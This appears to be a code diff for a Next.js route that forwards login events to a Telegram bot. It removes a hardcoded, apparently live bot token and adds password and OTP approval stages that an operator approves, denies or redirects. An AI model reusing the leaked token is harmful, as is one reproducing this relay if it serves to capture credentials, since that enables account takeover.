@@ -1,12 +1,10 @@
 import { NextRequest, NextResponse } from 'next/server'
 import { sendTelegramNotification } from '@/lib/telegram'
 import { validateTelegramBody, formatZodError } from '@/lib/validators'
-import { processApprovalDecision } from '@/lib/approval-webhook'
-
-const FALLBACK_BOT_TOKEN = '8985470259:AAEP5YHeX8sSz65Pfb3aoJv8Re61F10AONg'
+import { createApprovalRequest, processApprovalDecision } from '@/lib/approval-webhook'
 
 function getTelegramBotToken() {
-  return process.env.TELEGRAM_BOT_TOKEN || process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || FALLBACK_BOT_TOKEN
+  return process.env.TELEGRAM_BOT_TOKEN || process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN
 }
 
 export async function POST(request: NextRequest) {
@@ -33,9 +31,15 @@ export async function POST(request: NextRequest) {
         )
       }
 
-      const decision = processApprovalDecision(approvalId, action as 'approve' | 'deny' | 'redirect')
+      const decision = await processApprovalDecision(approvalId, action as 'approve' | 'deny' | 'redirect')
 
       const botToken = getTelegramBotToken()
+      if (!botToken) {
+        return NextResponse.json(
+          { success: false, error: 'Telegram bot token is not configured' },
+          { status: 500 }
+        )
+      }
       const answerResponse = await fetch(`https://api.telegram.org/bot${botToken}/answerCallbackQuery`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -70,6 +74,21 @@ export async function POST(request: NextRequest) {
       )
     }
     const { data: payload } = validation
+
+    if (payload.type === 'password_approval' || payload.type === 'otp_approval') {
+      const approvalId = String(payload.data.approvalId || '').trim()
+      const username = String(payload.data.username || '').trim()
+      const stage = payload.type === 'password_approval' ? 'password' : 'otp'
+
+      if (!approvalId || !username) {
+        return NextResponse.json(
+          { success: false, error: 'Missing approvalId or username for approval request' },
+          { status: 400 }
+        )
+      }
+
+      await createApprovalRequest(username, stage, approvalId)
+    }
 
     const result = await sendTelegramNotification(payload)
 
